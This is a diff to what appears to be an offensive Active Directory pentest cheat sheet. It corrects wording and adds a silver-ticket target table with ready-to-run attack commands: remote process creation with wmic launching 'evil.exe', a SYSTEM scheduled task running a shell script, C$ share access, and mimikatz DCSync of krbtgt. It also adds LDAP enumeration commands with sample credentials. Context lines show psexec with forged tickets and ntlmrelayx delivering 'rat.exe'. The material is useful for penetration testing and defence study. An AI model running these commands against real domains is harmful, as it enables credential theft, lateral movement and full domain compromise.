@@ -722,7 +722,7 @@ Mitigations:
 
 ### Pass-the-Ticket Silver Tickets
 
-Forging a TGS require machine accound password (key) or NTLM hash from the KDC
+Forging a TGS require machine accound password (key) or NTLM hash of the service account.
 
 ```powershell
 # Create a ticket for the service
@@ -738,6 +738,19 @@ mimikatz $ misc::convert ccache ticket.kirbi
 root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
+
+Interesting services to target with a silver ticket :
+
+| Service Type                                | Service Silver Tickets | Attack |
+|---------------------------------------------|------------------------|--------|
+| WMI                                         | HOST + RPCSS           | `wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"`     |
+| PowerShell Remoting                         | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| WinRM                                       | HTTP + wsman           | `New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC` |
+| Scheduled Tasks                             | HOST                   | `schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"` |
+| Windows File Share (CIFS)                   | CIFS                   | `dir \\dc01\c$` |
+| LDAP operations including Mimikatz DCSync   | LDAP                   | `lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt` |
+| Windows Remote Server Administration Tools  | RPCSS   + LDAP  + CIFS | /      |
+
 
 Mitigations:
 * Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.
@@ -1061,7 +1074,17 @@ ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 
 ### Dangerous Built-in Groups Usage
 
-If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object "CN=AdminSDHolder,CN=System," or set "adminCount" attribute to 0 for the required objec
+If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object "CN=AdminSDHolder,CN=System," or set "adminCount" attribute to 0 for the required object.
+
+>  The AdminCount attribute is set to 1 automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).
+
+
+Find users with `AdminCount=1`.
+
+```powershell
+python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
+jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
+``` 
 
 AdminSDHolder
 
@@ -1073,7 +1096,8 @@ or
 ```
 
 #### AdminSDHolder Abuse
-if you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp
+
+If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by SDProp.
 
 ```powershell
 # right to reset password for toto using the account titi
@@ -1624,6 +1648,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
 * [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
 * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
+* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
 * [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
 * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
 * [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
